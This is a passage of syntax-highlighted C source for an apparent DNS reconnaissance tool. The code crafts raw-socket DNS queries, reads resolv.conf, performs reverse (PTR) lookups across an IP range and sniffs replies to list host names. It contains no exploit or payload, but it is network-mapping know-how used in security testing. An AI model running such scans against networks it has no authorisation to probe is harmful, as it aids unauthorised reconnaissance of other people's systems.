  <span class="kw4">struct</span> dnshdr <span class="sy0">*</span>dns_header<span class="sy0">;</span>
  <span class="kw4">struct</span> dnsanswer <span class="sy0">*</span>answer<span class="sy0">;</span>
  <span class="kw4">struct</span> in_addr <span class="sy0">*</span>inaddr<span class="sy0">;</span>
&#160;
  ip_header  <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> iphdr<span class="sy0">*</span><span class="br0">&#41;</span>pkt<span class="sy0">;</span>
  length    <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> iphdr<span class="br0">&#41;</span><span class="sy0">;</span>
  udp_header <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> udphdr<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
  length    <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> udphdr<span class="br0">&#41;</span><span class="sy0">;</span>
  dns_header <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> dnshdr<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
  to_dns     <span class="sy0">=</span> length<span class="sy0">;</span>
  length    <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> dnshdr<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// make sure source port is 53</span>
  <span class="kw1">if</span><span class="br0">&#40;</span>udp_header<span class="sy0">-&gt;</span>source <span class="sy0">!=</span> htons<span class="br0">&#40;</span><span class="nu0">53</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
    <span class="kw1">return</span><span class="sy0">;</span>
&#160;
  <span class="co1">// return if there's no answers</span>
  <span class="kw1">if</span><span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>dns_header<span class="sy0">-&gt;</span>answer_rrs<span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">1</span><span class="br0">&#41;</span>
    <span class="kw1">return</span><span class="sy0">;</span>
&#160;
  <span class="co1">// loop over the questions and convert names to strings</span>
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;</span>ntohs<span class="br0">&#40;</span>dns_header<span class="sy0">-&gt;</span>questions<span class="br0">&#41;</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    convert_to_str<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> pkt <span class="sy0">+</span> len_pkt<span class="br0">&#41;</span><span class="sy0">;</span>
    length <span class="sy0">+=</span> strlen<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span> <span class="sy0">+</span> <span class="nu0">1</span> <span class="sy0">+</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> dnstype<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>length <span class="sy0">&gt;</span> len_pkt<span class="br0">&#41;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// loop over answers</span>
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;</span>ntohs<span class="br0">&#40;</span>dns_header<span class="sy0">-&gt;</span>answer_rrs<span class="br0">&#41;</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    answer  <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> dnsanswer<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
    length <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> dnsanswer<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>length <span class="sy0">&gt;</span> len_pkt<span class="br0">&#41;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
&#160;
    <span class="co1">// get the offset of the domain name for the answer</span>
    name <span class="sy0">=</span> <span class="br0">&#40;</span>pkt <span class="sy0">+</span> to_dns <span class="sy0">+</span> <span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>name<span class="br0">&#41;</span> <span class="sy0">&amp;</span> <span class="nu12">0xff</span><span class="br0">&#41;</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
    <span class="kw1">if</span><span class="br0">&#40;</span>length <span class="sy0">+</span> ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>len<span class="br0">&#41;</span> <span class="sy0">&gt;</span> len_pkt<span class="br0">&#41;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
&#160;
    <span class="co1">// A</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>qtype.<span class="me1">type</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span><span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>len<span class="br0">&#41;</span> <span class="sy0">!=</span> <span class="nu0">4</span><span class="br0">&#41;</span>
        <span class="kw1">return</span><span class="sy0">;</span>
      inaddr <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> in_addr<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;%s -&gt;&#160;%s (A)<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> name<span class="sy0">,</span> inet_ntoa<span class="br0">&#40;</span><span class="sy0">*</span>inaddr<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="co1">// CNAME</span>
    <span class="kw1">else</span> <span class="kw1">if</span><span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>qtype.<span class="me1">type</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">5</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      convert_to_str<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="sy0">,</span> ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>len<span class="br0">&#41;</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">,</span> pkt <span class="sy0">+</span> len_pkt<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;%s -&gt;&#160;%s (CNAME)<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> name<span class="sy0">,</span> pkt <span class="sy0">+</span> length <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="co1">// PTR</span>
    <span class="kw1">else</span> <span class="kw1">if</span><span class="br0">&#40;</span>ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>qtype.<span class="me1">type</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">12</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      convert_to_str<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="sy0">,</span> ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>len<span class="br0">&#41;</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">,</span> pkt <span class="sy0">+</span> len_pkt<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span><span class="br0">&#40;</span>strstr<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">,</span> domain<span class="br0">&#41;</span><span class="br0">&#41;</span>
        <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;%s -&gt;&#160;%s (PTR)<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> name<span class="sy0">,</span> pkt <span class="sy0">+</span> length <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
&#160;
    length <span class="sy0">+=</span> ntohs<span class="br0">&#40;</span>answer<span class="sy0">-&gt;</span>len<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// parse a newline delimited resolv.conf file</span>
<span class="co1">// arguments:</span>
<span class="co1">//   none</span>
<span class="kw4">void</span> parse_resolv_conf<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  FILE <span class="sy0">*</span>f<span class="sy0">;</span>
  <span class="kw4">char</span> ns<span class="br0">&#91;</span><span class="nu0">80</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">int</span> i <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  regex_t preg<span class="sy0">;</span>
  regmatch_t pmatch<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// IP regex</span>
  regcomp<span class="br0">&#40;</span><span class="sy0">&amp;</span>preg<span class="sy0">,</span> <span class="st0">&quot;^[0-9]+<span class="es1">\\</span>.[0-9]+<span class="es1">\\</span>.[0-9]+<span class="es1">\\</span>.[0-9]+<span class="es1">\n</span>$&quot;</span><span class="sy0">,</span> REG_EXTENDED<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span><span class="br0">&#40;</span>f <span class="sy0">=</span> fopen<span class="br0">&#40;</span>RESOLVCONF<span class="sy0">,</span> <span class="st0">&quot;r&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
    error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error opening:&#160;%s&quot;</span><span class="sy0">,</span> RESOLVCONF<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// count lines in file</span>
  <span class="kw1">while</span> <span class="br0">&#40;</span>fgets<span class="br0">&#40;</span>ns<span class="sy0">,</span> <span class="nu0">80</span><span class="sy0">,</span> f<span class="br0">&#41;</span> <span class="sy0">!=</span> NULL<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span>regexec<span class="br0">&#40;</span><span class="sy0">&amp;</span>preg<span class="sy0">,</span> ns<span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> pmatch<span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
      NUM_DNS<span class="sy0">++;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="co1">// go back to the beginning</span>
  rewind<span class="br0">&#40;</span>f<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// allocate the DNS servers array</span>
  dns_servers <span class="sy0">=</span> <span class="br0">&#40;</span>in_addr_t<span class="sy0">*</span><span class="br0">&#41;</span>malloc<span class="br0">&#40;</span><span class="kw4">sizeof</span><span class="br0">&#40;</span>in_addr_t<span class="br0">&#41;</span> <span class="sy0">*</span> NUM_DNS<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// populate array</span>
  <span class="kw1">while</span><span class="br0">&#40;</span>fgets<span class="br0">&#40;</span>ns<span class="sy0">,</span> <span class="nu0">80</span><span class="sy0">,</span> f<span class="br0">&#41;</span> <span class="sy0">!=</span> NULL<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>regexec<span class="br0">&#40;</span><span class="sy0">&amp;</span>preg<span class="sy0">,</span> ns<span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> pmatch<span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span>
      <span class="kw1">continue</span><span class="sy0">;</span>
    dns_servers<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">=</span> inet_addr<span class="br0">&#40;</span>ns<span class="br0">&#41;</span><span class="sy0">;</span>
    i<span class="sy0">++;</span>
  <span class="br0">&#125;</span>
&#160;
  fclose<span class="br0">&#40;</span>f<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// hexdump a char array (for debugging mainly)</span>
<span class="co1">// arguments:</span>
<span class="co1">//   pkt -&gt; char array to dump</span>
<span class="co1">//   len -&gt; number of bytes to print</span>
<span class="kw4">void</span> print_hex<span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>pkt<span class="sy0">,</span> <span class="kw4">int</span> len<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> i<span class="sy0">,</span> j<span class="sy0">;</span>
&#160;
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">,</span> j<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;</span>len<span class="sy0">;</span> i<span class="sy0">++,</span> j<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>j <span class="sy0">==</span> <span class="nu0">16</span><span class="br0">&#41;</span> j <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&#160;
    <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;%02x &quot;</span><span class="sy0">,</span> pkt<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">switch</span> <span class="br0">&#40;</span>j<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">case</span> <span class="nu0">7</span><span class="sy0">:</span>
        <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
      <span class="kw1">case</span> <span class="nu0">15</span><span class="sy0">:</span>
        <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw2">break</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
&#160;
  <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;<span class="es1">\n</span><span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// do a reverse dns search</span>
<span class="co1">// arguments:</span>
<span class="co1">//   range -&gt; IP range in format 192.168.0.0/24</span>
<span class="kw4">void</span> reverse_search<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>range<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span> lookup<span class="br0">&#91;</span><span class="nu0">29</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">struct</span> ipv4_network network<span class="sy0">;</span>
&#160;
  ip_range_init<span class="br0">&#40;</span>range<span class="sy0">,</span> <span class="sy0">&amp;</span>network<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">while</span><span class="br0">&#40;</span>ip_range_next<span class="br0">&#40;</span><span class="sy0">&amp;</span>network<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    network.<span class="me1">sin_addr</span>.<span class="me1">s_addr</span> <span class="sy0">=</span> network.<span class="me1">addr</span><span class="sy0">;</span>
    sprintf<span class="br0">&#40;</span>lookup<span class="sy0">,</span> <span class="st0">&quot;.%s.in-addr.arpa&quot;</span><span class="sy0">,</span> inet_ntoa<span class="br0">&#40;</span>network.<span class="me1">sin_addr</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    send_dns<span class="br0">&#40;</span>lookup<span class="sy0">,</span> <span class="nu0">12</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// remove trailing new lines</span>
<span class="co1">// arguments:</span>
<span class="co1">//   str -&gt; string to remove</span>
<span class="kw4">void</span> rstrip<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>str<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> i<span class="sy0">;</span>
&#160;
  <span class="co1">// loop over the string, if any newlines are found change to \0</span>
  <span class="kw1">for</span><span class="br0">&#40;</span>i<span class="sy0">=</span><span class="nu0">0</span><span class="sy0">;</span> i<span class="sy0">&lt;</span>strlen<span class="br0">&#40;</span>str<span class="br0">&#41;</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>str<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">==</span> <span class="st0">'<span class="es1">\n</span>'</span> <span class="sy0">||</span> str<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">==</span> <span class="st0">'<span class="es1">\r</span>'</span><span class="br0">&#41;</span>
      str<span class="br0">&#91;</span>i<span class="br0">&#93;</span> <span class="sy0">=</span> <span class="st0">'<span class="es5">\0</span>'</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// send a DNS request</span>
<span class="co1">// arguments:</span>
<span class="co1">//   target -&gt; domain to lookup</span>
<span class="co1">//   type   -&gt; DNS query type (1 for A, 12 for PTR)</span>
<span class="kw4">int</span> send_dns<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>target<span class="sy0">,</span> <span class="kw4">int</span> type<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">char</span>  <span class="sy0">*</span>pkt <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="sy0">*</span><span class="br0">&#41;</span>calloc<span class="br0">&#40;</span><span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw4">int</span> sock<span class="sy0">,</span> value <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">,</span> length <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw4">struct</span> iphdr  <span class="sy0">*</span>ip_header<span class="sy0">;</span>
  <span class="kw4">struct</span> udphdr <span class="sy0">*</span>udp_header<span class="sy0">;</span>
  <span class="kw4">struct</span> dnshdr <span class="sy0">*</span>dns_header<span class="sy0">;</span>
  <span class="kw4">struct</span> dnstype <span class="sy0">*</span>dns_type<span class="sy0">;</span>
  <span class="kw4">struct</span> sockaddr_in daddr<span class="sy0">;</span>
&#160;
  <span class="co1">// pick a random DNS server from the list</span>
  daddr.<span class="me1">sin_family</span>      <span class="sy0">=</span> AF_INET<span class="sy0">;</span>
  daddr.<span class="me1">sin_port</span>        <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu0">53</span><span class="br0">&#41;</span><span class="sy0">;</span>
  daddr.<span class="me1">sin_addr</span>.<span class="me1">s_addr</span> <span class="sy0">=</span> dns_servers<span class="br0">&#91;</span>rand<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="sy0">%</span> NUM_DNS<span class="br0">&#93;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// fill IP header</span>
  ip_header <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> iphdr<span class="sy0">*</span><span class="br0">&#41;</span>pkt<span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>ihl      <span class="sy0">=</span> <span class="nu0">5</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>version  <span class="sy0">=</span> <span class="nu0">4</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>tos      <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>id       <span class="sy0">=</span> htonl<span class="br0">&#40;</span>rand<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="sy0">%</span> <span class="nu0">65534</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>frag_off <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>ttl      <span class="sy0">=</span> <span class="nu0">255</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>protocol <span class="sy0">=</span> IPPROTO_UDP<span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>check    <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  ip_header<span class="sy0">-&gt;</span>daddr    <span class="sy0">=</span> daddr.<span class="me1">sin_addr</span>.<span class="me1">s_addr</span><span class="sy0">;</span>
&#160;
  length <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> iphdr<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// fill out UDP header</span>
  udp_header <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> udphdr<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
  udp_header<span class="sy0">-&gt;</span>source <span class="sy0">=</span> htons<span class="br0">&#40;</span>rand<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="sy0">%</span> <span class="nu0">65534</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  udp_header<span class="sy0">-&gt;</span>dest   <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu0">53</span><span class="br0">&#41;</span><span class="sy0">;</span>
  udp_header<span class="sy0">-&gt;</span>check  <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&#160;
  length <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> udphdr<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// fill out DNS header</span>
  dns_header <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> dnshdr<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
  dns_header<span class="sy0">-&gt;</span>txid         <span class="sy0">=</span> htons<span class="br0">&#40;</span>rand<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="sy0">%</span> <span class="nu0">65534</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">// recursion desired = 1</span>
  dns_header<span class="sy0">-&gt;</span>dns_flags.<span class="me1">rd</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
  dns_header<span class="sy0">-&gt;</span>questions    <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  length <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> dnshdr<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// convert domain to DNS format and copy into the packet</span>
  convert_to_dns<span class="br0">&#40;</span>target<span class="br0">&#41;</span><span class="sy0">;</span>
  memcpy<span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="sy0">,</span> target<span class="sy0">,</span> strlen<span class="br0">&#40;</span>target<span class="br0">&#41;</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  length <span class="sy0">+=</span> strlen<span class="br0">&#40;</span>target<span class="br0">&#41;</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
&#160;
  <span class="co1">// set the type and class</span>
  dns_type <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">struct</span> dnstype<span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>pkt <span class="sy0">+</span> length<span class="br0">&#41;</span><span class="sy0">;</span>
  dns_type<span class="sy0">-&gt;</span>type  <span class="sy0">=</span> htons<span class="br0">&#40;</span>type<span class="br0">&#41;</span><span class="sy0">;</span>
  dns_type<span class="sy0">-&gt;</span>class <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  length <span class="sy0">+=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> dnstype<span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  ip_header<span class="sy0">-&gt;</span>tot_len <span class="sy0">=</span> length<span class="sy0">;</span>
  udp_header<span class="sy0">-&gt;</span>len    <span class="sy0">=</span> htons<span class="br0">&#40;</span>length <span class="sy0">-</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> iphdr<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// spawn the raw socket</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>sock <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span> SOCK_RAW<span class="sy0">,</span> IPPROTO_UDP<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">&#41;</span>
    error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error socket:&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// tell the kernel we will handle our own headers</span>
  setsockopt<span class="br0">&#40;</span>sock<span class="sy0">,</span> IPPROTO_IP<span class="sy0">,</span> IP_HDRINCL<span class="sy0">,</span> <span class="sy0">&amp;</span>value<span class="sy0">,</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="co1">// send the packet</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>sendto<span class="br0">&#40;</span>sock<span class="sy0">,</span> pkt<span class="sy0">,</span> ip_header<span class="sy0">-&gt;</span>tot_len<span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="br0">&#40;</span><span class="kw4">struct</span> sockaddr<span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>daddr<span class="sy0">,</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> sockaddr<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">&#41;</span>
    error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error sendto:&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  free<span class="br0">&#40;</span>pkt<span class="br0">&#41;</span><span class="sy0">;</span>
  close<span class="br0">&#40;</span>sock<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&#160;
<span class="co1">// start UDP sniffer</span>
<span class="co1">// arguments:</span>
<span class="co1">//   domain -&gt; only print matching PTR records</span>
<span class="kw4">void</span> sniff_dns_replies<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>domain<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw4">int</span> sniffer<span class="sy0">,</span> sockaddr_size <span class="sy0">=</span> <span class="kw4">sizeof</span><span class="br0">&#40;</span><span class="kw4">struct</span> sockaddr<span class="br0">&#41;</span><span class="sy0">,</span> len_pkt<span class="sy0">;</span>
  <span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>buffer <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span>calloc<span class="br0">&#40;</span><span class="nu0">65560</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw4">struct</span> sockaddr saddr<span class="sy0">;</span>
&#160;
  <span class="co1">// start a raw socket</span>
  <span class="kw1">if</span><span class="br0">&#40;</span><span class="br0">&#40;</span>sniffer <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span> SOCK_RAW<span class="sy0">,</span> IPPROTO_UDP<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">&#41;</span>
    error<span class="br0">&#40;</span><span class="st0">&quot;[!] Error socket:&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&#160;
  <span class="kw1">for</span><span class="br0">&#40;</span><span class="sy0">;;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
